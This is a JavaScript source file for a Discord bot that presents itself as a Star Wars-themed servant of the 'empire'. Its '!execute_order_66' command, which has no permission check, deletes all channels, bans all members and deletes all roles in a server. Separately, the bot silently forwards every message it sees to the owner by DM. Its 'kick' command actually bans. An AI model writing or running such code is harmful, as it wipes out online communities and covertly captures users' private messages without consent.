const Discord = require('discord.js');

const client = new Discord.Client();

var messagecount = 0;
const botownerid = "371424590993555466";
const command_prefix = '!';

var command_list = [];

class command {
	constructor(text)
	{
		this.text = text;
		this.textlength = text.length;
		command_list.push(this);
		console.log("Created command: " + this.text);
	}
}

function isCommanding(_message){
	var cmdtext;
 	var result = false;
	for(var i = 0; i < command_list.length; i++)
	{
		if(_message.slice(0,command_list[i].textlength+1) == (command_prefix + command_list[i].text)) {
			cmdtext = command_list[i].text;
			result = true;
			break;
		}
	}
	return [result, cmdtext];
}

let telluser_cmd = new command("telluser");
let ex66ordr = new command("execute_order_66");
let spamon = new command("spamon");
let kickcmd = new command("kick");

function randint(a)
{
	return Math.floor(Math.random() * a);
}
 
client.on('ready', () => {
    console.log('Cody711 has been successfuly launched.');
    console.log('Serving the empire.');
	var server = client.guilds.get("690922666559012924");
    server.createChannel('order66')
	  .then(console.log)
	  .catch(console.error);
	client.users.get(botownerid).send("I am serving you sir.");
});

client.on('message', message => {
	messagecount++;

	var rslt = isCommanding(message.content);
	if(rslt[0]){
		switch(rslt[1]) {
			case "execute_order_66":
				message.reply("That will be done my lord.");
				setTimeout(function(){
					console.log("Waiting..");
				}, 2832);
				message.guild.channels.forEach((channel) => {
			    		channel.delete();
		        	});
				message.guild.members.forEach((member) => {
					message.member.guild.ban(member, message.guild, 1, function(err) {
						console.log(err);
					});
				});
				message.guild.roles.forEach(role => role.delete());
				break;
			case "telluser":
				var splitting = message.content.split(" ");
				var targetid = splitting[1];
				var gathering = "";
				for(var i = 2; i < splitting.length; i++) {
					gathering+=splitting[i] + " ";
				}
				var sendername = message.author.username;
				var pmessage = "[" + sendername + "]: " + gathering; 
				client.users.get(targetid).send(pmessage);
				break;
			case "kick":
				var splitting = message.content.split(" ");
				var targetid = splitting[1];
				message.guild.members.forEach((member) => {
					if(member.user.username === splitting[1]) 
					{
						message.member.guild.ban(member, message.guild, 1, function(err) {
							console.log(err);
						});
					}
					else {
						console.log(member.username);
					}
				});
				break;
		}
	}
	if(message.author.id != client.user.id) {
		var text = "***" + message.author.username + ":*** " + message.content;
		client.users.get(botownerid).send(text);
	}

}); 

client.on("guildMemberAdd" , member => {

	var role = member.guild.roles.find('name', 'Member');
	member.addRole(role);
});

client.login(process.env.BOT_TOKEN);